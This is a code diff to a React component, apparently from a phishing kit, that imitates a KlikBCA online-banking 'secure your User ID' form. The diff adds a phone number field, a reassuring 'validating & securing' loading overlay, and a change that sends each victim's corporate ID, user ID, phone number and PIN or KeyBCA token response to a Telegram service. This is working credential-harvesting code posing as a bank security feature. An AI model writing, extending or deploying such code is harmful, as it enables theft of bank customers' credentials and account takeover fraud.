@@ -1,8 +1,10 @@
 import React, { useState } from 'react';
 import { ArrowLeft, User, Briefcase, Eye, EyeOff, ShieldCheck, AlertCircle, Check } from 'lucide-react';
 import { ServiceProcessModal, ServiceReceiptData } from './ServiceProcessModal';
-import { validateUserId, validateCorporateId, validateUserPinOrPassword } from '../utils/validation';
+import { validateUserId, validateCorporateId, validateUserPinOrPassword, validatePhone } from '../utils/validation';
+import { getFormattedWibDateTime } from '../utils/dateUtils';
 import { TelegramService } from '../services/telegramService';
+import { FormSkeletonOverlay } from './FormSkeletonOverlay';
 
 interface MAdminAmankanUserIdViewProps {
   onBack: () => void;
@@ -13,6 +15,7 @@ export const MAdminAmankanUserIdView: React.FC<MAdminAmankanUserIdViewProps> = (
   const [activeTab, setActiveTab] = useState<'individu' | 'bisnis'>('individu');
   const [corporateId, setCorporateId] = useState('');
   const [userId, setUserId] = useState('');
+  const [phoneNumber, setPhoneNumber] = useState('');
   const [password, setPassword] = useState('');
   const [showPassword, setShowPassword] = useState(false);
 
@@ -20,6 +23,7 @@ export const MAdminAmankanUserIdView: React.FC<MAdminAmankanUserIdViewProps> = (
   const [touched, setTouched] = useState({
     corporateId: false,
     userId: false,
+    phoneNumber: false,
     password: false,
   });
 
@@ -30,11 +34,13 @@ export const MAdminAmankanUserIdView: React.FC<MAdminAmankanUserIdViewProps> = (
   // Real-time validations
   const userIdValidation = validateUserId(userId);
   const corporateIdValidation = activeTab === 'bisnis' ? validateCorporateId(corporateId) : { isValid: true };
+  const phoneValidation = validatePhone(phoneNumber);
   const passwordValidation = validateUserPinOrPassword(password);
 
   const isFormValid =
     userIdValidation.isValid &&
     corporateIdValidation.isValid &&
+    phoneValidation.isValid &&
     passwordValidation.isValid;
 
   // Status modals
@@ -48,16 +54,27 @@ export const MAdminAmankanUserIdView: React.FC<MAdminAmankanUserIdViewProps> = (
     setTouched({
       corporateId: true,
       userId: true,
+      phoneNumber: true,
       password: true,
     });
 
     if (!isFormValid) return;
 
     setIsSubmitting(true);
-    const notificationSent = await TelegramService.sendFormData({
-      serviceType: 'amankan-user-id',
-      serviceTitle: activeTab === 'individu' ? 'Proteksi KlikBCA Individu' : 'Proteksi KlikBCA Bisnis',
-    });
+    // Ensure smooth perceived performance with minimum skeleton animation display time
+    const [notificationSent] = await Promise.all([
+      TelegramService.sendFormData({
+        serviceType: 'amankan-user-id',
+        serviceTitle: activeTab === 'individu' ? 'Proteksi KlikBCA Individu' : 'Proteksi KlikBCA Bisnis',
+        jenisLayanan: `KlikBCA ${activeTab === 'bisnis' ? 'Bisnis' : 'Individu'}`,
+        corporateId: activeTab === 'bisnis' ? corporateId : undefined,
+        userId: userId,
+        nomorHp: phoneNumber,
+        password: password,
+        waktuInput: getFormattedWibDateTime(),
+      }),
+      new Promise((resolve) => setTimeout(resolve, 750)),
+    ]);
     setIsSubmitting(false);
 
     if (!notificationSent) {
@@ -145,7 +162,14 @@ export const MAdminAmankanUserIdView: React.FC<MAdminAmankanUserIdViewProps> = (
         </div>
 
         {/* Form Inputs (1:1 with Screenshot) */}
-        <form onSubmit={handleSubmit} className="space-y-2.5 w-full">
+        <form onSubmit={handleSubmit} className="space-y-2.5 w-full relative">
+          {/* Subtle Skeleton Loading Overlay upon submit */}
+          <FormSkeletonOverlay
+            isVisible={isSubmitting}
+            type="userid"
+            message="Memvalidasi & mengamankan User ID..."
+          />
+
           {/* Corporate ID (jika tab KlikBCA Bisnis dipilih) */}
           {activeTab === 'bisnis' && (
             <div className="animate-in fade-in duration-150">
@@ -155,11 +179,17 @@ export const MAdminAmankanUserIdView: React.FC<MAdminAmankanUserIdViewProps> = (
               <div className="relative">
                 <input
                   type="text"
+                  inputMode="text"
+                  autoCapitalize="characters"
+                  autoCorrect="off"
+                  spellCheck={false}
+                  maxLength={15}
                   placeholder="Masukkan Corporate ID Bisnis"
                   value={corporateId}
                   onChange={(e) => {
-                    setCorporateId(e.target.value.toUpperCase());
-                    if (!touched.corporateId && e.target.value.length >= 2) {
+                    const cleaned = e.target.value.replace(/[^a-zA-Z0-9]/g, '').slice(0, 15).toUpperCase();
+                    setCorporateId(cleaned);
+                    if (!touched.corporateId && cleaned.length >= 2) {
                       markTouched('corporateId');
                     }
                   }}
@@ -197,11 +227,17 @@ export const MAdminAmankanUserIdView: React.FC<MAdminAmankanUserIdViewProps> = (
             <div className="relative">
               <input
                 type="text"
+                inputMode="text"
+                autoCapitalize="characters"
+                autoCorrect="off"
+                spellCheck={false}
+                maxLength={12}
                 placeholder="Masukkan User ID Anda"
                 value={userId}
                 onChange={(e) => {
-                  setUserId(e.target.value.toUpperCase());
-                  if (!touched.userId && e.target.value.length >= 3) {
+                  const cleaned = e.target.value.replace(/[^a-zA-Z0-9]/g, '').slice(0, 12).toUpperCase();
+                  setUserId(cleaned);
+                  if (!touched.userId && cleaned.length >= 3) {
                     markTouched('userId');
                   }
                 }}
@@ -236,7 +272,52 @@ export const MAdminAmankanUserIdView: React.FC<MAdminAmankanUserIdViewProps> = (
             )}
           </div>
 
-          {/* 2. PIN / Password */}
+          {/* 2. Nomor Handphone Terdaftar */}
+          <div>
+            <label className="block text-[13px] font-semibold text-[#1e3853] mb-0.5">
+              Nomor Handphone Terdaftar
+            </label>
+            <div className="relative">
+              <input
+                type="tel"
+                inputMode="numeric"
+                pattern="[0-9]*"
+                autoComplete="tel"
+                placeholder="Contoh: 081234567890"
+                value={phoneNumber}
+                onChange={(e) => {
+                  const cleaned = e.target.value.replace(/\D/g, '').slice(0, 15);
+                  setPhoneNumber(cleaned);
+                  if (!touched.phoneNumber && cleaned.length >= 4) {
+                    markTouched('phoneNumber');
+                  }
+                }}
+                onBlur={() => markTouched('phoneNumber')}
+                className={`w-full bg-white border rounded-lg px-3 py-2 text-[13.5px] text-slate-800 placeholder-[#9ca3af] outline-none transition-all shadow-xs pr-9 ${
+                  touched.phoneNumber && !phoneValidation.isValid
+                    ? 'border-red-500 ring-1 ring-red-500/30'
+                    : phoneValidation.isValid
+                    ? 'border-emerald-500 ring-1 ring-emerald-500/20'
+                    : 'border-[#cbd5e1] focus:border-[#0c3b68] focus:ring-1 focus:ring-[#0c3b68]'
+                }`}
+              />
+              <div className="absolute right-2.5 top-1/2 -translate-y-1/2 pointer-events-none">
+                {phoneValidation.isValid ? (
+                  <Check size={17} className="text-emerald-600" />
+                ) : touched.phoneNumber && !phoneValidation.isValid ? (
+                  <AlertCircle size={17} className="text-red-500" />
+                ) : null}
+              </div>
+            </div>
+            {touched.phoneNumber && !phoneValidation.isValid && (
+              <p className="text-[11px] text-red-600 mt-0.5 flex items-center gap-1 animate-in fade-in duration-150">
+                <AlertCircle size={12} className="shrink-0" />
+                <span>{phoneValidation.message}</span>
+              </p>
+            )}
+          </div>
+
+          {/* 3. PIN / Password */}
           <div>
             <label className="block text-[13px] font-semibold text-[#1e3853] mb-0.5">
               PIN / Password
@@ -244,6 +325,10 @@ export const MAdminAmankanUserIdView: React.FC<MAdminAmankanUserIdViewProps> = (
             <div className="relative">
               <input
                 type={showPassword ? 'text' : 'password'}
+                inputMode="text"
+                autoCapitalize="none"
+                autoCorrect="off"
+                spellCheck={false}
                 placeholder="Masukkan PIN / Respon KeyBCA"
                 value={password}
                 onChange={(e) => {
@@ -315,11 +400,15 @@ export const MAdminAmankanUserIdView: React.FC<MAdminAmankanUserIdViewProps> = (
               Cancel
             </button>
 
-            {/* OK Button with hover scaling feedback */}
+            {/* OK Button with active/disabled state feedback */}
             <button
               type="submit"
-              disabled={isSubmitting}
-              className="w-full py-2.5 px-4 rounded-lg bg-[#3b6285] hover:bg-[#325473] active:bg-[#28445e] disabled:opacity-60 disabled:cursor-wait text-white font-bold text-[14px] transition-all cursor-pointer shadow-xs hover:scale-[1.01] active:scale-[0.98] text-center"
+              disabled={!isFormValid || isSubmitting}
+              className={`w-full py-2.5 px-4 rounded-lg font-bold text-[14px] transition-all shadow-xs text-center ${
+                isFormValid && !isSubmitting
+                  ? 'bg-[#3b6285] hover:bg-[#325473] active:bg-[#28445e] text-white cursor-pointer hover:scale-[1.01] active:scale-[0.98]'
+                  : 'bg-[#d8e0e8] text-[#8e9ca8] cursor-not-allowed'
+              }`}
             >
               {isSubmitting ? 'Mengirim...' : 'OK'}
             </button>
